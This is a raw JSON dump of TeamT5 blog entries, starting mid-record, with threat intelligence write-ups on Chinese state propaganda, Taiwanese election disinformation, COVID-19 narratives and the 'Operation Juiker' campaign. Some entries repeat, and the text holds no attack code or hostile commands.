Firewall","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1594807939/1920_1280_1920-1280_%E8%A4%87%E6%9C%AC_3_4730f822ca.jpg","contents":[{"locale":"en","_id":"5f0e5aae163518003f86d97f","title":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","context":"To confront the emerging threat of China's Information Operation, TeamT5 threat intelligence team publishes this White Paper covering how China conduct information manipulation across Chinese social media platforms. From the 2019 Hong Kong Protest to the 2020 COVID-19 pandemic, China has demonstrated the art of surveillance, censorship, and most importantly, digital propaganda.\n\nIn this white paper, we focus on China's digital propaganda inside the Great Firewall. We suggest that the regime has developed a unique, organizational, and sophisticated propaganda mechanism, which we dub as \"digital propaganda formula.\" With this formula, the Chinese Communist Party (CCP) has managed to transform all the Chinese social media platforms inside the Great Firewall into an almost total pro-CCP environment.\n\n#### Key Takeaways\n\n1. CCP has strengthened its control over Chinese cyberspace by establishing legislations as well as centralizing administrations, and the \"last mile\" of its cyber governance is to control public opinion through censorship and digital propaganda.\n\n2. We dub China's sophisticated propaganda mechanism the \"digital propaganda formula,\" which consists of state media, communist youth league, governmental affairs new media, as well as trolling factory.\n\n3. Moreover, CCP's policies have bolstered the industry of \"public opinion guidance\" in China. The industry practitioners have developed AI and big data-powered systems to help the government to collect, store, and analyze public sentiment.\n\n4. China's formula has polluted the online information environment inside the Great Firewall. We assess that the CCP is trying to project its digital propaganda dominance to foreign social media platforms in order to control the world's discourse power. \n\nFollowing the global pandemic, the world relies on the internet more than ever.

From the 2018 municipal elections to the 2020 general elections, Taiwan has witnessed the growing threat of disinformation to the citizens. It was observed that many malicious actors utilized social media to disseminate a huge amount of fake news, false information, and hate speech. These disinformation are like highly contagious viruses that will not only affect the people consuming them, but also make them secondary disseminators. We assess that:\n\n1. Virus-like disinformation makes everyone on social media both victim and disseminator\n\n   Although public discussion is the cornerstone of a good democratic society, many attacks have used voter enthusiasm to spread on social media. We have observed that many of the voters who participated in the discussion turned out to be the source of dissemination.\n2. Disinformation continues to evolve in tactics and quantity, as well as expanding its targets\n\n   The Taiwanese Central Election Commission (CEC) stated that the number of disinformation cases before the 2020 elections reached an unprecedented level. In addition to the evolution in quantity and tactics, we observed that the dissemination of disinformation did not stop even after the election, but instead shifted the target.\n3. China continues to increase its influence\n\n   Apart from news agency promoting the Chinese policies, inauthentic accounts run by bot, and patriotic netizens (A.K.A little pink), China has stepped up its influence on social media platforms to shape narratives.\n4. Information operations are outsourced, layer-by-layer\n\n   Before the elections, a number of marketing firms and new media were established to spread political messages. We discovered that some of them have connections with certain political parties, implying the layer-by-layer outsourcing of Information Operations by politically motivated actors.\n\nFrom the perspective of security researchers, we integrated the Information Operations intercepted and investigated by TeamT5 over the past two years, hoping to contribute to the next democratic election.\n\nIf you are interested in this white paper, please fill out the form, and we will send you the report by email.\n\nCOMING UP NEXT: We will publish reports about how China conduct Information Operation on social media platforms, targeting domestic citizens and foreign audiences.

To assess the full version of the analysis, please subscribe our report \"Cyber Affairs Biweekly-Update.\"*\n\n### Key Takeaways\n\n1. China has exerted ever greater influence over the globe since the outbreak of the coronavirus. Over the past three months, TeamT5 has been monitoring how China utilizes its cyber strength and propaganda machine to handle the Covid-19 pandemic.\n2. The Chinese authorities have collaborated with telecom firms and tech giants in China, using technologies such as big data to control the public opinion and people's movement. The regime has implemented measures such as digital surveillance, keywords censorship on social media applications, and Health Code System.\n3. Moreover, China has also exercised its propaganda machine to shape both domestic and international narrative of the pandemic. The Chinese officials and Chinese state media have utilized various social media platforms, particularly Weibo and Twitter, to disseminate propaganda to Chinese people and foreign audiences. Some Chinese officials have connived and even promoted online conspiracy theory, which claimed China is not the origin of the coronavirus.\n\n### Blurred Lines Between State and Corps: Telecom Surveillance and Health Code System\n\nThe Chinese Communist Party (CCP) has collaborated with its national tech giants and telecom firms to implement a series of security measures in the name of containing the coronavirus outbreak.\n\nThe regime has elevated its digital control over domestic citizens. In mid-February, China's Ministry of Industry and Information Technology (MIIT) sent a notice to Information and Communications Technology (ICT) service providers, demanding relevant firms to strengthen monitoring and censorship over online public discussion.\\[1\\] The MIIT also announced the utilization of telecom big data analysis in support of the battle against the coronavirus. \\[2\\]\n\nAs the country tried to resume normal operations, the Chinese authorities launched Health Code System, using big data to monitor citizens' health status and then regulate their movement. The Health Code System is developed by the Ant Financial, an affiliate company of the Chinese Alibaba Group, and Tencent in collaboration with the Chinese authorities.\n\nThe system has raised privacy concerns since it connects and integrates databases of government units and private firms, forming a comprehensive surveillance system which contains real name, phone number, ID, address, travel history, health status and contact history. Moreover, only 3 out of 16 Health Code Apps list their user agreement and privacy policy at installation, while others will directly direct users to the registration page to fill out personal information.\\[3\\] This shows that most of the users' data are collected, processed, and shared without informed consent.\n\n### Strategic Distraction and Positive Propaganda Targeting Domestic Citizens\n\nThe authoritarian regime is also in another battle to shape the public opinion about the epidemic. Initially, the Chinese state media employed strategic distraction to mitigate the seriousness of the coronavirus. Before Wuhan Lockdown on January 23, Chinese state media started reporting the Influenza B in the United States.\\[4\\] The topic \"Influenza B outbreak in the US\" (美国爆发乙型流感) reached 500 million views and 31,000 discussions on Weibo.\\[5\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_1_4fb4158a6a.png)_Figure 1: News report by the China Central Television (CCTV)._\n\nAs the number confirmed cases soared in China, the Chinese state media outlets started to spread positive propaganda. For instance, they highly praised the Chinese authorities' handling of the virus by highlighting the rapid construction of Huoshenshan Hospital.\\[6\\] They also promoted narratives such as \"the Chinese people are sacrificing to fight the virus\", accompanied by praises from WHO Director General Tedros Adhanom Ghebreyesus.\\[7\\]\\[8\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718736/SR_2_0b7b7f6542.png)_Figure 2: YouTube video by China Global Television Network (CGTN)._\n\nThe regime has seized the opportunity to demonstrate the country's strength to contain the virus as well as the advantages of an authoritarian regime. The CCP uses the case to show that its authoritarian governance system is more effective than the liberal democracies when facing a crisis like the Covid-19 pandemic.\n\n### Propaganda, Hoaxes and Conspiracy Theories: From Troublemaker to Global Savior\n\nAlthough China was widely criticized for its delayed and opaque treatment to the coronavirus outbreak during the initial stage, the regime has backed on its feet to polish its international image after the pandemic seems to have subsided in China.\n\nIn particular, Italy, the first G-7 country to join China's Belt and Road Initiative (BRI), became a favorable environment for the regime to launch propaganda. We observed a series of propaganda was launched against Italy.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_3_c2c0ee47d2.png)_Figure 3: The Chinese embassy posted a series of tweets to promote China's medical aids foe Italy, using hashtag #ForzaCinaeItalia_\n\nThe campaign is revealed to have boosted by social manipulation, as the hashtag #ForzaCinaeItalia (Go China, go Italy) was promoted by Twitter bot accounts.\\[9\\]\n\nIn another case, since March 15, Chinese state media outlets as well as Chinese diplomats Hua Chunying and Zhao Lijian have promoted a video of Italian chanting \"Grazie, Cina!\" on their balconies with the Chinese anthem \"March of the Volunteers\" playing.\\[10\\] The video was examined by researchers and was claimed to be manufactured.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718737/SR_4_b4d7e95934.png)_Figure 4: Hua Chunying's sharing the video on Twitter._\n\n### \"Origin\" Propaganda: Conspiracy Theories of Patient Zero\n\nConspiracy theories of the origin of the coronavirus have emerged across social media platforms as early as January. One of the significant cases is a conspiracy theory claiming that the US military had brought the coronavirus to Wuhan during the 2019 Military World Games.\n\nStarting from March 12, 2020, Zhao Lijian, a deputy director of the Chinese Foreign Ministry's Information Department, has posted a series of tweet to amplify the conspiracy theory on Twitter. In one of his tweets, he shared a video clip of US Centers for Disease Control (CDC) chief Robert Redfield saying some Covid-19 death might have been diagnosed as influenza in the US, using it as evidence that the virus originated in the US.\\[11\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_5_2802d4b539.png)_Figure 5: A series of tweets by Zhao Lijian promoting the conspiracy theory, along with articles of \"globalresearch.ca\".

Starting from March 22, multiple Chinese state media outlets have published news article titled \"Coronavirus may have existed in Italy since November: local researcher,\" implying that Italy was the origin of Coronavirus.\\[12\\]\\[13\\] They cited the words of the Italian physician Giuseppe Remuzzi in an interview with NPR on March 19 \\[14\\], using it as statement to prove that China is not the origin of the coronavirus.\n\nAlthough Remuzzi protested that his words were twisted by China, the narrative has already gone viral.\\[15\\] The CCTV created a topic \"Expert claims the coronavirus may have existed in Italy since November\" (专家称疫情去年11月或已在意大利流行), which reached approximately 500 million views and 35,000 discussion posts.\n\n### Conclusion\n\nChina's cyber strength and digital influence did not scale down even in the times of the pandemic. Instead, the regime took the opportunity to pose itself as a global leader more capable than the US. We can see that the CCP has well mastered its cyber capabilities and propaganda machine, expanding the regime's control from physical entities to public opinion. Moreover, the CCP has elevated its efforts to shape international opinion through the Twitter platform. We assess that the CCP will have more power of discourse and influence after they learned to conduct propaganda campaign on foreign social media platforms, and every party should be vigilant about it.\n\n### Reference\n\n\\[1\\] 工业和信息化部办公厅关于做好疫情防控期间信息通信行业网络安全保障工作的通知 (MIIT's Notice on Cybersecurity Practice for Information and Communications Technology (ICT) Service Providers During Epidemic Control)  \nhttp://www.miit.gov.cn/n1146290/n1146402/c7681785/content.html\n\n\\[2\\] 工业和信息化部召开媒体通气会 介绍电信大数据分析、支撑服务疫情防控总体情况 (MIIT's Media Briefing on the Utilization of Telecom Big Data Analysis on Epidemic Control)  \nhttp://www.miit.gov.cn/n1146290/n1146402/c7678438/content.html\n\n\\[3\\] 健康码的隐私政策还有哪些改进空间？(Room of Improvement on the Health Code System's Privacy Policy)  \nhttps://www.jiemian.com/article/4120372.html\n\n\\[4\\] 美国暴发40年来最致命流感 已有6600人死亡 (US' Worst Influenza Outbreak in 40 Years, 6600 Americans Killed)  \nhttp://news.sina.com.cn/w/2020-01-22/doc-iihnzhha4088647.shtml\n\n\\[5\\] https://s.weibo.com/weibo?q=%23美国爆发乙型流感%23\u0026Refer=SWeibo_box\n\n\\[6\\] CGTN: Time lapse video: Construction of Wuhan Huoshenshan Hospital completed  \nhttps://www.youtube.com/watch?v=53nhErXUd9A\n\n\\[7\\] 中国人民\"正在为全人类作贡献\" (Chinese People are Contributing for All Human Kind)  \nhttp://world.people.com.cn/n1/2020/0308/c1002-31622166.html\n\n\\[8\\] Xinhua Net: China deserves appreciation for efforts, sacrifices in fighting epidemic: WHO chief  \nhttp://www.xinhuanet.com/english/2020-02/16/c_138789289.htm\n\n\\[9\\] How China unleashed Twitter bots to spread COVID-19 propaganda in Italy  \nhttps://formiche.net/2020/03/china-unleashed-twitter-bots-covid19-propaganda-italy/\n\n\\[10\\] https://twitter.com/SpokespersonCHN/status/1239041044580188162  \nhttps://twitter.com/zlj517/status/1239112822908276736  \nCGTN: Italians play Chinese national anthem to thank China for its aid  \nhttps://www.youtube.com/watch?v=8ZKsA2jbwlk  \nCCTV: Italians play Chinese national anthem, chanting \"Grazie Cina\"  \nhttps://www.facebook.com/watch/?v=201784281098386\n\n\\[11\\] https://twitter.com/zlj517/status/1238111898828066823\n\n\\[12\\] Coronavirus may have existed in Italy since November: local researcher  \nhttps://news.cgtn.com/news/2020-03-22/Coronavirus-may-have-existed-in-Italy-since-November-local-researcher-P4i2As2OAg/index.html\n\n\\[13\\] Italian doctors saw strange pneumonia cases before China's COVID-19 outbreak, report says   \nhttp://www.china.org.cn/world/Off_the_Wire/2020-03/22/content_75845579.htm\n\n\\[14\\] 'Every Single Individual Must Stay Home': Italy's Coronavirus Surge Strains Hospitals  \nhttps://www.npr.org/2020/03/19/817974987/every-single-individual-must-stay-home-italy-s-coronavirus-deaths-pass-china-s?t=1585131614833\n\n\\[15\\] Beijing twisted my words on coronavirus's Italian origin, says scientist Giuseppe Remuzzi  \nhttps://www.thetimes.co.uk/article/beijing-twisted-my-words-on-coronaviruss-italian-origin-says-scientist-giuseppe-remuzzi-6twwhkrvn","createdAt":"2020-05-24T17:56:37.931Z","updatedAt":"2020-07-02T09:41:31.546Z","__v":0,"id":"5ecab555602fc90040476054"}],"createdAt":"2020-05-24T17:56:37.926Z","updatedAt":"2021-01-08T06:55:16.343Z","__v":1,"topic":"5ecaa02ba792d70040a0d8b3","author":"5eeae9e3163518003f86d917","publish_date":"2020-04-21T02:00:00.000Z","id":"5ecab555602fc90040476053"},{"publish":true,"enable_form":true,"tags":["5f0e5b52163518003f86d983","5f0e6732163518003f86d9aa","5f0e6743163518003f86d9ab","5ecf6ceefedd7f004b26974a","5f0e6315163518003f86d9a9"],"relative_posts":["5ecab44c602fc90040476047","602e177fc56e80003f985a0e","5f866d3ada3440005757a928"],"_id":"5f0e5aad163518003f86d97e","post_url":"teamt5-information-operation-white-paper-china-s-digital-propaganda-formula-inside-the-great-firewall","post_name":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1594807939/1920_1280_1920-1280_%E8%A4%87%E6%9C%AC_3_4730f822ca.jpg","contents":[{"locale":"en","_id":"5f0e5aae163518003f86d97f","title":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","context":"To confront the emerging threat of China's Information Operation, TeamT5 threat intelligence team publishes this White Paper covering how China conduct information manipulation across Chinese social media platforms. From the 2019 Hong Kong Protest to the 2020 COVID-19 pandemic, China has demonstrated the art of surveillance, censorship, and most importantly, digital propaganda.\n\nIn this white paper, we focus on China's digital propaganda inside the Great Firewall. We suggest that the regime has developed a unique, organizational, and sophisticated propaganda mechanism, which we dub as \"digital propaganda formula.\" With this formula, the Chinese Communist Party (CCP) has managed to transform all the Chinese social media platforms inside the Great Firewall into an almost total pro-CCP environment.\n\n#### Key Takeaways\n\n1. CCP has strengthened its control over Chinese cyberspace by establishing legislations as well as centralizing administrations, and the \"last mile\" of its cyber governance is to control public opinion through censorship and digital propaganda.\n\n2. We dub China's sophisticated propaganda mechanism the \"digital propaganda formula,\" which consists of state media, communist youth league, governmental affairs new media, as well as trolling factory.\n\n3. Moreover, CCP's policies have bolstered the industry of \"public opinion guidance\" in China. The industry practitioners have developed AI and big data-powered systems to help the government to collect, store, and analyze public sentiment.\n\n4. China's formula has polluted the online information environment inside the Great Firewall. We assess that the CCP is trying to project its digital propaganda dominance to foreign social media platforms in order to control the world's discourse power. \n\nFollowing the global pandemic, the world relies on the internet more than ever.

The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1. China has escalated the level of overt InfoOps via state-media and diplomats.\n\u003cbr\u003e\n\u003cbr\u003e\nChinese state media, diplomats, and embassies are the main actors of Chinese overt InfoOps. They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2. Covert InfoOps remain active on Western social media platforms.\n\u003cbr\u003e\n\u003cbr\u003e\n2020 is a year which has set many records. This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3. APT actors might have entered the InfoOps threat landscape.\n\u003cbr\u003e\n\u003cbr\u003e\nThe situation is become more alarming as we discovered that the Advanced Persistent Threat (APT) actors might have entered the InfoOps threat landscape. APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks. We suggest that it is crucial for government units, critical infrastructure operators, and major business vendors to apply threat intelligence to combat this issue.\n\u003cbr\u003e\n\u003cbr\u003e\n\nIf you are interested in this white paper, please fill out the form below and get the full-text PDF.\n\u003cbr\u003e\n\u003cbr\u003e\nAnd don't miss our blog updates!

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n\u003cbr\u003e","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa02ba792d70040a0d8b3","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"}],"id":"5ecaa02ba792d70040a0d8b3"},"attachment_id":"1S2BP61rYAg3t-hguAauU2xGymGq5Nc84","id":"5f0e5aad163518003f86d97e"},{"publish":true,"enable_form":false,"tags":[{"_id":"5ecf6ceefedd7f004b26974a","name":"China","createdAt":"2020-05-28T07:49:02.515Z","updatedAt":"2020-10-14T03:40:05.244Z","__v":0,"posts":[{"publish":true,"enable_form":true,"tags":["5ece28882e1ee4004aa406f2","5ecf6cd6fedd7f004b269748","5ecf6ce4fedd7f004b269749","5ecf6cf8fedd7f004b26974b","5ecf6d00fedd7f004b26974c","5ecf6ceefedd7f004b26974a"],"relative_posts":["5f0e5aad163518003f86d97e","602e177fc56e80003f985a0e","5f866d3ada3440005757a928"],"_id":"5ecab44c602fc90040476047","post_url":"teamt5-information-operation-white-paper-observations-on-2020-taiwanese-general-elections","post_name":"TeamT5 Information Operation White Paper: Observations on 2020  Taiwanese General Elections","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342706/info_ops_part1_blog_cover_ad439b498b.jpg","contents":[{"locale":"en","_id":"5ecab44c602fc90040476048","title":"TeamT5 Information Operation White Paper: Observations on 2020 Taiwanese General Elections","context":"The ubiquity of social media has altered the way people consume information, which in turn dramatically changed the way electoral campaigns are run.

Virus-like disinformation makes everyone on social media both victim and disseminator\n\n   Although public discussion is the cornerstone of a good democratic society, many attacks have used voter enthusiasm to spread on social media. We have observed that many of the voters who participated in the discussion turned out to be the source of dissemination.\n2. Disinformation continues to evolve in tactics and quantity, as well as expanding its targets\n\n   The Taiwanese Central Election Commission (CEC) stated that the number of disinformation cases before the 2020 elections reached an unprecedented level. In addition to the evolution in quantity and tactics, we observed that the dissemination of disinformation did not stop even after the election, but instead shifted the target.\n3. China continues to increase its influence\n\n   Apart from news agency promoting the Chinese policies, inauthentic accounts run by bot, and patriotic netizens (A.K.A little pink), China has stepped up its influence on social media platforms to shape narratives.\n4. Information operations are outsourced, layer-by-layer\n\n   Before the elections, a number of marketing firms and new media were established to spread political messages. We discovered that some of them have connections with certain political parties, implying the layer-by-layer outsourcing of Information Operations by politically motivated actors.\n\nFrom the perspective of security researchers, we integrated the Information Operations intercepted and investigated by TeamT5 over the past two years, hoping to contribute to the next democratic election.\n\nIf you are interested in this white paper, please fill out the form, and we will send you the report by email.\n\nCOMING UP NEXT: We will publish reports about how China conduct Information Operation on social media platforms, targeting domestic citizens and foreign audiences.

To assess the full version of the analysis, please subscribe our report \"Cyber Affairs Biweekly-Update.\"*\n\n### Key Takeaways\n\n1. China has exerted ever greater influence over the globe since the outbreak of the coronavirus. Over the past three months, TeamT5 has been monitoring how China utilizes its cyber strength and propaganda machine to handle the Covid-19 pandemic.\n2. The Chinese authorities have collaborated with telecom firms and tech giants in China, using technologies such as big data to control the public opinion and people's movement. The regime has implemented measures such as digital surveillance, keywords censorship on social media applications, and Health Code System.\n3. Moreover, China has also exercised its propaganda machine to shape both domestic and international narrative of the pandemic. The Chinese officials and Chinese state media have utilized various social media platforms, particularly Weibo and Twitter, to disseminate propaganda to Chinese people and foreign audiences. Some Chinese officials have connived and even promoted online conspiracy theory, which claimed China is not the origin of the coronavirus.\n\n### Blurred Lines Between State and Corps: Telecom Surveillance and Health Code System\n\nThe Chinese Communist Party (CCP) has collaborated with its national tech giants and telecom firms to implement a series of security measures in the name of containing the coronavirus outbreak.\n\nThe regime has elevated its digital control over domestic citizens. In mid-February, China's Ministry of Industry and Information Technology (MIIT) sent a notice to Information and Communications Technology (ICT) service providers, demanding relevant firms to strengthen monitoring and censorship over online public discussion.\\[1\\] The MIIT also announced the utilization of telecom big data analysis in support of the battle against the coronavirus. \\[2\\]\n\nAs the country tried to resume normal operations, the Chinese authorities launched Health Code System, using big data to monitor citizens' health status and then regulate their movement. The Health Code System is developed by the Ant Financial, an affiliate company of the Chinese Alibaba Group, and Tencent in collaboration with the Chinese authorities.\n\nThe system has raised privacy concerns since it connects and integrates databases of government units and private firms, forming a comprehensive surveillance system which contains real name, phone number, ID, address, travel history, health status and contact history. Moreover, only 3 out of 16 Health Code Apps list their user agreement and privacy policy at installation, while others will directly direct users to the registration page to fill out personal information.\\[3\\] This shows that most of the users' data are collected, processed, and shared without informed consent.\n\n### Strategic Distraction and Positive Propaganda Targeting Domestic Citizens\n\nThe authoritarian regime is also in another battle to shape the public opinion about the epidemic. Initially, the Chinese state media employed strategic distraction to mitigate the seriousness of the coronavirus. Before Wuhan Lockdown on January 23, Chinese state media started reporting the Influenza B in the United States.\\[4\\] The topic \"Influenza B outbreak in the US\" (美国爆发乙型流感) reached 500 million views and 31,000 discussions on Weibo.\\[5\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_1_4fb4158a6a.png)_Figure 1: News report by the China Central Television (CCTV)._\n\nAs the number confirmed cases soared in China, the Chinese state media outlets started to spread positive propaganda. For instance, they highly praised the Chinese authorities' handling of the virus by highlighting the rapid construction of Huoshenshan Hospital.\\[6\\] They also promoted narratives such as \"the Chinese people are sacrificing to fight the virus\", accompanied by praises from WHO Director General Tedros Adhanom Ghebreyesus.\\[7\\]\\[8\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718736/SR_2_0b7b7f6542.png)_Figure 2: YouTube video by China Global Television Network (CGTN)._\n\nThe regime has seized the opportunity to demonstrate the country's strength to contain the virus as well as the advantages of an authoritarian regime. The CCP uses the case to show that its authoritarian governance system is more effective than the liberal democracies when facing a crisis like the Covid-19 pandemic.\n\n### Propaganda, Hoaxes and Conspiracy Theories: From Troublemaker to Global Savior\n\nAlthough China was widely criticized for its delayed and opaque treatment to the coronavirus outbreak during the initial stage, the regime has backed on its feet to polish its international image after the pandemic seems to have subsided in China.\n\nIn particular, Italy, the first G-7 country to join China's Belt and Road Initiative (BRI), became a favorable environment for the regime to launch propaganda. We observed a series of propaganda was launched against Italy.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_3_c2c0ee47d2.png)_Figure 3: The Chinese embassy posted a series of tweets to promote China's medical aids foe Italy, using hashtag #ForzaCinaeItalia_\n\nThe campaign is revealed to have boosted by social manipulation, as the hashtag #ForzaCinaeItalia (Go China, go Italy) was promoted by Twitter bot accounts.\\[9\\]\n\nIn another case, since March 15, Chinese state media outlets as well as Chinese diplomats Hua Chunying and Zhao Lijian have promoted a video of Italian chanting \"Grazie, Cina!\" on their balconies with the Chinese anthem \"March of the Volunteers\" playing.\\[10\\] The video was examined by researchers and was claimed to be manufactured.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718737/SR_4_b4d7e95934.png)_Figure 4: Hua Chunying's sharing the video on Twitter._\n\n### \"Origin\" Propaganda: Conspiracy Theories of Patient Zero\n\nConspiracy theories of the origin of the coronavirus have emerged across social media platforms as early as January. One of the significant cases is a conspiracy theory claiming that the US military had brought the coronavirus to Wuhan during the 2019 Military World Games.\n\nStarting from March 12, 2020, Zhao Lijian, a deputy director of the Chinese Foreign Ministry's Information Department, has posted a series of tweet to amplify the conspiracy theory on Twitter. In one of his tweets, he shared a video clip of US Centers for Disease Control (CDC) chief Robert Redfield saying some Covid-19 death might have been diagnosed as influenza in the US, using it as evidence that the virus originated in the US.\\[11\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_5_2802d4b539.png)_Figure 5: A series of tweets by Zhao Lijian promoting the conspiracy theory, along with articles of \"globalresearch.ca\". The website often promotes anti-US conspiracy theory._\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_6_2bb97447e7.png)_Figure 6: Global Times reporting the conspiracy theory about US military personnel bringing COVID-19 to China._\n\nBesides the US, Italy is also one of the scapegoats for China's coronavirus origin propaganda. Starting from March 22, multiple Chinese state media outlets have published news article titled \"Coronavirus may have existed in Italy since November: local researcher,\" implying that Italy was the origin of Coronavirus.\\[12\\]\\[13\\] They cited the words of the Italian physician Giuseppe Remuzzi in an interview with NPR on March 19 \\[14\\], using it as statement to prove that China is not the origin of the coronavirus.\n\nAlthough Remuzzi protested that his words were twisted by China, the narrative has already gone viral.\\[15\\] The CCTV created a topic \"Expert claims the coronavirus may have existed in Italy since November\" (专家称疫情去年11月或已在意大利流行), which reached approximately 500 million views and 35,000 discussion posts.\n\n### Conclusion\n\nChina's cyber strength and digital influence did not scale down even in the times of the pandemic. Instead, the regime took the opportunity to pose itself as a global leader more capable than the US. We can see that the CCP has well mastered its cyber capabilities and propaganda machine, expanding the regime's control from physical entities to public opinion. Moreover, the CCP has elevated its efforts to shape international opinion through the Twitter platform. We assess that the CCP will have more power of discourse and influence after they learned to conduct propaganda campaign on foreign social media platforms, and every party should be vigilant about it.\n\n### Reference\n\n\\[1\\] 工业和信息化部办公厅关于做好疫情防控期间信息通信行业网络安全保障工作的通知 (MIIT's Notice on Cybersecurity Practice for Information and Communications Technology (ICT) Service Providers During Epidemic Control)  \nhttp://www.miit.gov.cn/n1146290/n1146402/c7681785/content.html\n\n\\[2\\] 工业和信息化部召开媒体通气会 介绍电信大数据分析、支撑服务疫情防控总体情况 (MIIT's Media Briefing on the Utilization of Telecom Big Data Analysis on Epidemic Control)  \nhttp://www.miit.gov.cn/n1146290/n1146402/c7678438/content.html\n\n\\[3\\] 健康码的隐私政策还有哪些改进空间？(Room of Improvement on the Health Code System's Privacy Policy)  \nhttps://www.jiemian.com/article/4120372.html\n\n\\[4\\] 美国暴发40年来最致命流感 已有6600人死亡 (US' Worst Influenza Outbreak in 40 Years, 6600 Americans Killed)  \nhttp://news.sina.com.cn/w/2020-01-22/doc-iihnzhha4088647.shtml\n\n\\[5\\] https://s.weibo.com/weibo?q=%23美国爆发乙型流感%23\u0026Refer=SWeibo_box\n\n\\[6\\] CGTN: Time lapse video: Construction of Wuhan Huoshenshan Hospital completed  \nhttps://www.youtube.com/watch?v=53nhErXUd9A\n\n\\[7\\] 中国人民\"正在为全人类作贡献\" (Chinese People are Contributing for All Human Kind)  \nhttp://world.people.com.cn/n1/2020/0308/c1002-31622166.html\n\n\\[8\\] Xinhua Net: China deserves appreciation for efforts, sacrifices in fighting epidemic: WHO chief  